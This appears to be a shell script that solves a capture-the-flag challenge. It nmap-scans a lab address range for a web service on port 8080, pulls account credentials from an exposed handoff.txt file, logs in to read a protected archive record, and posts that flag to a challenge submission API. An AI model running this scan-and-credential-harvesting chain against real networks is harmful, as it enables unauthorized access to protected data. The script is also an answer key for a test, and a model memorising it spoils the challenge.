#!/bin/sh
set -eu

scan="$(nmap -n -p 8080 --open -oG - 172.20.0.141-199)"
host="$(printf '%s\n' "$scan" | python3 -c 'import re,sys; m=re.search(r"Host: ([0-9.]+).*Ports:.*8080/open", sys.stdin.read()); print(m.group(1) if m else "")')"
if [ -z "$host" ]; then
  echo "No web service found in the challenge range" >&2
  exit 1
fi

landing="$(curl --fail --silent "http://$host:8080/")"
printf '%s' "$landing" | python3 -c 'import sys; s=sys.stdin.read(); raise SystemExit(0 if "/handoff.txt" in s else 1)'
handoff="$(curl --fail --silent "http://$host:8080/handoff.txt")"
username="$(printf '%s\n' "$handoff" | sed -n 's/^Mirror account: //p' | head -n 1)"
password="$(printf '%s\n' "$handoff" | sed -n 's/^Passphrase: //p' | head -n 1)"
if [ -z "$username" ] || [ -z "$password" ]; then
  echo "Could not recover account details" >&2
  exit 1
fi

record="$(curl --fail --silent --user "$username:$password" "http://$host:8080/archive")"
flag="$(printf '%s\n' "$record" | sed -n 's/^Archive record: //p' | head -n 1)"
if [ -z "$flag" ]; then
  echo "Protected archive record was empty" >&2
  exit 1
fi

payload="$(FLAG_VALUE="$flag" python3 -c 'import json,os; print(json.dumps({"challenge_id":"scl-challenge-frame-d5c5d1","task_id":"task1","flag":os.environ["FLAG_VALUE"]}))')"
curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' --data-binary "$payload"
printf '\n'
